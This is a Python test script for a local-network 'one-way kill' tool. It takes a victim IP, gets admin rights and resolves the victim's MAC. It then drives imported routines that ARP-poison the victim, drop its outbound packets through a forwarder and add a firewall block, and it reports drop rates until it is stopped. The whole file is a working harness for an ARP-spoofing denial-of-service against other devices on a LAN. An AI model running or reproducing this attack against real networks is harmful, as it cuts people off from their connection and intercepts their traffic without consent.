#!/usr/bin/env python3
"""
Interactive One-Way Kill test
Run as Administrator on Windows / sudo on macOS

Usage:
  python test_oneway_kill.py <victim_ip>
  
Example:
  python test_oneway_kill.py 192.168.1.100
"""
import sys
import os
import time

sys.path.append(os.path.join(os.getcwd(), 'src'))

def main():
    if len(sys.argv) < 2:
        print("Usage: python test_oneway_kill.py <victim_ip>")
        print("Example: python test_oneway_kill.py 192.168.1.100")
        sys.exit(1)
    
    victim_ip = sys.argv[1]
    
    print("="*60)
    print(" ONE-WAY KILL TEST")
    print("="*60)
    print(f"Target: {victim_ip}")
    print(f"Platform: {sys.platform}")
    
    # Check admin
    is_admin = False
    if sys.platform.startswith('win'):
        try:
            import ctypes
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        except:
            pass
    else:
        is_admin = os.geteuid() == 0
    
    if not is_admin:
        print("\n✗ ERROR: Must run as Administrator/root!")
        sys.exit(1)
    
    print("✓ Running with admin privileges")
    
    # Import modules
    print("\n[1] Importing modules...")
    try:
        from tools.utils import get_default_iface, get_my_ip, get_gateway_ip, get_gateway_mac
        from networking.killer import Killer
        from networking.scanner import Scanner
        from scapy.all import getmacbyip
        print("    ✓ Imports successful")
    except Exception as e:
        print(f"    ✗ Import failed: {e}")
        sys.exit(1)
    
    # Initialize
    print("\n[2] Initializing scanner...")
    try:
        scanner = Scanner()
        scanner.init()
        print(f"    My IP: {scanner.my_ip}")
        print(f"    Router IP: {scanner.router_ip}")
        print(f"    Router MAC: {scanner.router_mac}")
        print(f"    Interface: {scanner.iface.name} ({scanner.iface.guid[:40]}...)")
    except Exception as e:
        print(f"    ✗ Scanner init failed: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
    
    # Resolve victim MAC
    print(f"\n[3] Resolving victim MAC for {victim_ip}...")
    try:
        victim_mac = getmacbyip(victim_ip)
        if victim_mac:
            print(f"    ✓ Victim MAC: {victim_mac}")
        else:
            print(f"    ✗ Could not resolve MAC for {victim_ip}")
            print("    Try pinging the device first, or check if it's on the same network")
            sys.exit(1)
    except Exception as e:
        print(f"    ✗ MAC resolution failed: {e}")
        sys.exit(1)
    
    # Create victim dict
    victim = {
        'ip': victim_ip,
        'mac': victim_mac,
        'vendor': 'Unknown',
        'type': 'User',
        'name': 'Test Target',
        'admin': False
    }
    
    # Initialize killer
    print("\n[4] Initializing killer...")
    try:
        killer = Killer()
        killer.router = scanner.router
        print(f"    ✓ Killer initialized")
        print(f"    Router: {killer.router}")
    except Exception as e:
        print(f"    ✗ Killer init failed: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
    
    # Start one-way kill with debug
    print("\n[5] Starting One-Way Kill (debug mode)...")
    print(f"    Victim: {victim_ip} / {victim_mac}")
    print(f"    This will:")
    print(f"      - Start ARP poisoning")
    print(f"      - Start forwarder (drop outbound, allow inbound)")
    print(f"      - Add firewall rule to block outbound")
    
    try:
        # Start kill first
        print("\n    [5a] Starting ARP poison...")
        killer.kill(victim)
        time.sleep(1)
        
        if victim_mac in killer.killed:
            print(f"    ✓ Victim added to killed list")
        else:
            print(f"    ⚠ Victim not in killed list yet")
        
        # Start forwarder with debug
        print("\n    [5b] Starting forwarder (debug=True)...")
        killer._start_one_way_forwarder(victim, debug=True)
        
        if victim_mac in killer.forwarders:
            print(f"    ✓ Forwarder registered")
        else:
            print(f"    ✗ Forwarder NOT registered!")
        
        # Add firewall rule
        print("\n    [5c] Adding firewall rule...")
        killer._enforce_pf_block(victim_ip)
        
        if victim_ip in killer.pf_blocks:
            print(f"    ✓ Firewall rule added")
        else:
            print(f"    ⚠ Firewall rule may not have been added")
        
    except Exception as e:
        print(f"    ✗ One-Way Kill failed: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
    
    # Monitor
    print("\n[6] Monitoring forwarder (press Ctrl+C to stop)...")
    print("    Watching for packet statistics...")
    print()
    
    try:
        last_stats = None
        while True:
            stats = killer.get_forwarder_stats(victim_mac)
            if stats:
                if stats != last_stats:
                    print(f"    Packets: {stats['packets_seen']} seen, "
                          f"{stats['packets_dropped']} dropped, "
                          f"{stats['packets_forwarded']} forwarded")
                    if stats['packets_seen'] > 0 and stats['packets_dropped'] == 0:
                        print("    ⚠ WARNING: Packets seen but none dropped!")
                        print(f"       drop_from_victim={stats['drop_from_victim']}")
                    last_stats = stats.copy()
            else:
                print("    ⚠ No forwarder stats available")
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n\n[7] Stopping...")
    
    # Cleanup
    print("\n[8] Cleaning up...")
    try:
        killer.unkill(victim)
        print("    ✓ Unkilled victim")
    except Exception as e:
        print(f"    ⚠ Cleanup error: {e}")
    
    # Final stats
    print("\n" + "="*60)
    print(" FINAL STATS")
    print("="*60)
    stats = killer.get_forwarder_stats(victim_mac)
    if stats:
        print(f"  Packets seen: {stats['packets_seen']}")
        print(f"  Packets dropped: {stats['packets_dropped']}")
        print(f"  Packets forwarded: {stats['packets_forwarded']}")
        
        if stats['packets_seen'] > 0:
            drop_rate = stats['packets_dropped'] / stats['packets_seen'] * 100
            print(f"  Drop rate: {drop_rate:.1f}%")
            
            if stats['packets_dropped'] == 0:
                print("\n  ✗ PROBLEM: No packets were dropped!")
                print("    Possible causes:")
                print("    - Forwarder not receiving traffic (ARP poison not working)")
                print("    - drop_from_victim flag not set correctly")
                print("    - Traffic not matching victim IP")
            elif drop_rate < 40:
                print("\n  ⚠ WARNING: Low drop rate")
                print("    Some outbound traffic may be getting through")
            else:
                print("\n  ✓ One-Way Kill appears to be working")
    else:
        print("  No stats available (forwarder may have been stopped)")
    
    print("\n" + "="*60)

if __name__ == '__main__':
    main()


